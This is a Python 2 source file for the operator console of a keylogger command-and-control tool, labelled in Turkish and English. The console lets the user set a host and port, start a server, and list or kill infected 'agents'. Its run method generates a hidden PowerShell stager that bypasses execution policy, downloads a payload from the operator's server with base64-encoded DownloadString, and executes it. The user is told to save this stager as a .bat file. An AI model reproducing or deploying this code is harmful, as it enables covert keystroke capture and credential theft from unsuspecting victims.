#! /usr/bin/env python
# -*- coding: UTF-8 -*-
import sys
import os
import time
import threading
import base64
import re
from Lib import web
from Lib import prettytable
from System import Banner
from System import Global
from System.Colors import bcolors
from System.Server import server

class Command:
	COMMANDS 	= ['exit','show','help','set','run','list','kill']
	HELPCOMMANDS	= [
		['exit','Konsoldan Çık | Exit the console'],
		['list','Tüm aracıları listele | List all agents'],
		['kill','Aracıları Sonlandır | Kill an agent'],
		['run',"Komut ve Denetleyiciyi Çalıştır | Run Command and Controler"],
		['help','Yardım Menüsü | Help Menu'],
		['set','Bir değişkeni bir değere ayarla | Sets a variable to a value'],
		['show',"Komut ve Denetleyici değişkenlerini göster | Show Command and Controler variables"]
	]

	def help(self,args=None):
		table 	 = prettytable.PrettyTable([bcolors.BOLD + 'Komut | Command' + bcolors.ENDC,bcolors.BOLD + 'Açıklama | Description' + bcolors.ENDC])
		table.border = False
		table.align  = 'l'
		table.add_row(['-'*7,'-'*11])
		for i in self.HELPCOMMANDS:
			table.add_row([bcolors.OKBLUE +  i[0] + bcolors.ENDC,i[1]])
		print table
	def exit(self,args=None):
		print '  ____________'
		print ' < By-Emirhan >'
		print '  ------------'
		os._exit(0)

	def list(self,args=None):
		table 	 = prettytable.PrettyTable([bcolors.BOLD + 'ID' + bcolors.ENDC, bcolors.BOLD + 'IP' + bcolors.ENDC, bcolors.BOLD + 'Kullanıcı Adı | Username' + bcolors.ENDC])
		table.border = False
		table.align  = 'l'
		table.add_row(['-'*2,'-'*2,'-'*8])
		for i in Global.AGENTS:
			j = re.search('^([0-9]{1,3})\.([0-9]{1,3})\.([0-9]{1,3})\.([0-9]{1,3})*', i).group()
			table.add_row([bcolors.OKBLUE +  i + bcolors.ENDC,j,i[len(j)+1:]])
		print table

	def kill(self,args):
		if(len(args) < 2):
			return None
		if(args[1] in Global.AGENTS):
			Global.AGENTS.remove(args[1])

	def run(self,args=None):
		print "Not: Aşağıda verilen kodu metin belgesine yapıştırıp, .bat dosyası olarak kaydedin. "
		print "Note: Paste the code given below into the text document and save it as a .bat file."
		flag = True
		for i in options:
			if(options[i][1] and options[i][0] == ''):
				print bcolors.FAIL + '[-]' + bcolors.ENDC + ' set ' + i
				flag = False
		if(flag):
			print bcolors.OKGREEN + '[+] Sunucu Başlatıldı | Server start on: ' + bcolors.ENDC + ("http://%s:%s/")%(options['host'][0],options['port'][0])
			threading.Thread(target=server, args=(options['port'][0],options['host'][0],)).start()
			time.sleep(1)
			command = "powershell -exec bypass -WindowStyle Hidden IEX(IEX(\"[System.Text.Encoding]::UTF8.GetString([System.Convert]::FromBase64String('"+base64.b64encode('(New-Object Net.WebClient).DownloadString("http://%s:%s/get_payload")'%(options['host'][0],options['port'][0]))+"'))\"))"
			print bcolors.OKGREEN + '[+] KeyLogger Başlatıldı | KeyLogger Started: '+ bcolors.ENDC + '\n' +command
			

	def set(self,args):
		if(len(args) < 2):
			return None
		if(options.has_key(args[1])):
			options[args[1]][0] = args[2]

	def show(self,args=None):
		table 	 = prettytable.PrettyTable([bcolors.BOLD + ' İsim | Name' + bcolors.ENDC,bcolors.BOLD + 'Mevcut Ayar | Current Setting' + bcolors.ENDC,bcolors.BOLD + 'Gerekli | Required' + bcolors.ENDC,bcolors.BOLD + 'Açıklama | Description' + bcolors.ENDC])
		table.border = False
		table.align  = 'l'
		table.add_row(['-'*4,'-'*15,'-'*8,'-'*11])
		for i in options:
			table.add_row([bcolors.OKBLUE +  i + bcolors.ENDC,options[i][0],options[i][1],options[i][2]])
				
		print table 

agents	= list()
options = {
	'port'		:['8080'	,True	,'Komuta ve Denetleyici bağlantı noktası | The Command and Controler port'],
	'host'		:[''		,True	,'Komuta ve Denetleyici IP adresi | The Command and Controler IP address']
	}


def main():
	Banner.Banner()
	Command().help()
	while True:
		input	= raw_input('KeyLogger > ').strip().split()
		if(input):
			if(input[0] in Command.COMMANDS):
				result = getattr(globals()['Command'](),input[0])(input)	

main()


		
	
